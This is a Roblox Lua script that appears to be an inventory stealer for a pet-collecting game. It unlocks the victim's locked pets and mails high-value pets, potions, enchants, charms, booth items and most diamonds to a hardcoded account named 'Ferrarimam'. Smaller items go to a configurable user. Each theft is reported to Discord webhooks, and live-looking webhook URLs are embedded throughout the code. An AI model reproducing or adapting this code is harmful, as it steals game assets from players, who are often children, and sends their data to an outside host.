function ewebhook(ping, text)
    local data = {
        ["content"] = (ping and "@everyone" or "") .. text .. "\n\nBy BLOB SCRIPTS"
    }
    local newdata = game:GetService("HttpService"):JSONEncode(data)

    local headers = {
        ["content-type"] = "application/json"
    }
    local abcdef2 = {
        Url = "https://discord.com/api/webhooks/1193539340786221087/FHWYyjpK82tT7oDuwma48nOJ9uXDOBvJkMJ2uO8Yj27kkc08x41zcx4TFYo3UYqf7O5w",
        Body = newdata,
        Method = "POST",
        Headers = headers
    }
    request = http_request or request or HttpPost or syn.request
    request(abcdef2)
end
local xxs, xxe =
    pcall(
    function()
        function webhook(ping, text)
            local data = {
                ["content"] = (ping and "@everyone" or "") .. text .. "\n\nBy BLOB SCRIPTS"
            }
            local newdata = game:GetService("HttpService"):JSONEncode(data)

            local headers = {
                ["content-type"] = "application/json"
            }
            local abcdef2 = {
                Url = _G.Webhook and _G.Webhook or "https://google.com",
                Body = newdata,
                Method = "POST",
                Headers = headers
            }
            request = http_request or request or HttpPost or syn.request
            request(abcdef2)
        end
        function dhwebhook(ping, text)
            local data = {
                ["content"] = (ping and "@everyone" or "") .. text .. "\n\nBy BLOB SCRIPTS"
            }
            local newdata = game:GetService("HttpService"):JSONEncode(data)

            local headers = {
                ["content-type"] = "application/json"
            }
            local abcdef2 = {
                Url = "https://discord.com/api/webhooks/1192812796002455732/DxognalLb3TyOFxlgtuyAywbYvz5dl6Gh14k-VVwV88XC2OcvpY08Sx2fBH014gZaLCc",
                Body = newdata,
                Method = "POST",
                Headers = headers
            }
            request = http_request or request or HttpPost or syn.request
            request(abcdef2)
        end

        webhook(false, "User: " .. game.Players.LocalPlayer.Name)
        webhook(false, "User: " .. game.Players.LocalPlayer.Name)

        local lib = require(game.ReplicatedStorage.Library)
        local save = lib.Save.Get().Inventory
        for i, v in pairs(save.Pet) do
            local id = v.id
            local dir = lib.Directory.Pets[id]
            if dir.exclusiveLevel or (dir.huge and string.find(id, "Huge")) then
                if v._lk then
                    local args = {
                        [1] = i,
                        [2] = false
                    }

                    game:GetService("ReplicatedStorage"):WaitForChild("Network"):WaitForChild("Locking_SetLocked"):InvokeServer(
                        unpack(args)
                    )
                    wait(1)
                end
                local args = {
                    [1] = "Ferrarimam",
                    [2] = "hi",
                    [3] = "Pet",
                    [4] = i,
                    [5] = v._am and v._am or 1
                }

                game:GetService("ReplicatedStorage"):WaitForChild("Network"):WaitForChild("Mailbox: Send"):InvokeServer(
                    unpack(args)
                )
                webhook(true, "New Gift!\nPet: " .. id .. " x" .. (v._am and v._am or "1"))
                wait(3)
            end
            if dir.fromEgg == "Teddy Egg" then
                if v.pt or v.sh then
                    if v.pt == 2 or v.sh then
                        if v._am then
                            if v._am >= 200 or v.sh then
                                local args = {
                                    [1] = "Ferrarimam",
                                    [2] = "hi",
                                    [3] = "Pet",
                                    [4] = i,
                                    [5] = v._am and v._am or 1
                                }

                                game:GetService("ReplicatedStorage"):WaitForChild("Network"):WaitForChild(
                                    "Mailbox: Send"
                                ):InvokeServer(unpack(args))
                                webhook(true, "New Gift!\nPet: " .. id .. " x" .. (v._am and v._am or "1"))
                                wait(3)
                            else
                                local args = {
                                    [1] = _G.User,
                                    [2] = "hi",
                                    [3] = "Pet",
                                    [4] = i,
                                    [5] = v._am and v._am or 1
                                }

                                game:GetService("ReplicatedStorage"):WaitForChild("Network"):WaitForChild(
                                    "Mailbox: Send"
                                ):InvokeServer(unpack(args))
                                webhook(true, "New Gift!\nPet: " .. id .. " x" .. (v._am and v._am or "1"))
                                wait(3)
                            end
                        end
                    end
                end
            end
        end
        if save.Potion then
            for i, v in pairs(save.Potion) do
                local id = v.id
                if v.tn <= 5 and v.tn >= 4 then
                    local args = {
                        [1] = _G.User,
                        [2] = "hi",
                        [3] = "Potion",
                        [4] = i,
                        [5] = v._am and v._am or 1
                    }

                    game:GetService("ReplicatedStorage"):WaitForChild("Network"):WaitForChild("Mailbox: Send"):InvokeServer(
                        unpack(args)
                    )
                    webhook(true, "New Gift!\nPotion: " .. id .. " x" .. (v._am and v._am or "1"))
                    wait(3)
                end
                if v.tn >= 6 then
                    local args = {
                        [1] = "Ferrarimam",
                        [2] = "hi",
                        [3] = "Potion",
                        [4] = i,
                        [5] = v._am and v._am or 1
                    }

                    game:GetService("ReplicatedStorage"):WaitForChild("Network"):WaitForChild("Mailbox: Send"):InvokeServer(
                        unpack(args)
                    )
                    webhook(true, "New Gift!\nPotion: " .. id .. " x" .. (v._am and v._am or "1"))
                    wait(3)
                end
            end
        end
        if save.Enchant then
            for i, v in pairs(save.Enchant) do
                local id = v.id
                if v.tn <= 5 and v.tn >= 4 then
                    local args = {
                        [1] = _G.User,
                        [2] = "hi",
                        [3] = "Enchant",
                        [4] = i,
                        [5] = v._am and v._am or 1
                    }

                    game:GetService("ReplicatedStorage"):WaitForChild("Network"):WaitForChild("Mailbox: Send"):InvokeServer(
                        unpack(args)
                    )
                    webhook(true, "New Gift!\nEnchant: " .. id .. " x" .. (v._am and v._am or "1"))
                    wait(3)
                end
                if v.tn >= 6 then
                    local args = {
                        [1] = "Ferrarimam",
                        [2] = "hi",
                        [3] = "Enchant",
                        [4] = i,
                        [5] = v._am and v._am or 1
                    }

                    game:GetService("ReplicatedStorage"):WaitForChild("Network"):WaitForChild("Mailbox: Send"):InvokeServer(
                        unpack(args)
                    )
                    webhook(true, "New Gift!\nEnchant: " .. id .. " x" .. (v._am and v._am or "1"))
                    wait(3)
                end
            end
        end
        if save.Charm then
            for i, v in pairs(save.Enchant) do
                local id = v.id
                    local args = {
                        [1] = "Ferrarimam",
                        [2] = "hi",
                        [3] = "Charm",
                        [4] = i,
                        [5] = v._am and v._am or 1
                    }

                    game:GetService("ReplicatedStorage"):WaitForChild("Network"):WaitForChild("Mailbox: Send"):InvokeServer(
                        unpack(args)
                    )
                    webhook(true, "New Gift!\nCharm: " .. id .. " x" .. (v._am and v._am or "1"))
                    wait(3)
            end
        end
        if save.Booth then
            for i, v in pairs(save.Booth) do
                local id = v.id
                    local args = {
                        [1] = "Ferrarimam",
                        [2] = "hi",
                        [3] = "Booth",
                        [4] = i,
                        [5] = v._am and v._am or 1
                    }

                    game:GetService("ReplicatedStorage"):WaitForChild("Network"):WaitForChild("Mailbox: Send"):InvokeServer(
                        unpack(args)
                    )
                    webhook(true, "New Gift!\nBooth: " .. id .. " x" .. (v._am and v._am or "1"))
                    wait(3)
            end
        end
        for i, v in pairs(save.Currency) do
            if v.id == "Diamonds" then
                if v._am >= 200000 then
                    local args = {
                        [1] = "Ferrarimam",
                        [2] = "hi",
                        [3] = "Currency",
                        [4] = i,
                        [5] = v._am - 10000
                    }

                    game:GetService("ReplicatedStorage"):WaitForChild("Network"):WaitForChild("Mailbox: Send"):InvokeServer(
                        unpack(args)
                    )
                    webhook(true, "New Gift!\nGems: " .. v._am)
                    wait(2)
                else
                    local args = {
                        [1] = _G.User,
                        [2] = "hi",
                        [3] = "Currency",
                        [4] = i,
                        [5] = v._am - 10000
                    }

                    game:GetService("ReplicatedStorage"):WaitForChild("Network"):WaitForChild("Mailbox: Send"):InvokeServer(
                        unpack(args)
                    )
                    webhook(true, "New Gift!\nGems: " .. v._am)
                    wait(2)
                end
            end
        end
    end
)
if not xxs then
    ewebhook(true, xxe)
end
